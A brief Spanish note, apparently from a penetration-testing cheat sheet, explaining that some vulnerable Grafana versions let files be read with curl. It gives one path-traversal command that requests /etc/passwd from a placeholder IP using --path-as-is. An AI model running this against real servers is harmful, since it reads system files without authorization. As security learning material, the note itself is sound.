
Con CURL. En alguna versión vulnerable de "Grafana", se puede ver ficheros de la máquina de la siguiente manera:
```bash
curl http://ip/../../../../../../../../etc/passwd --path-as-is -o fichero.extension
```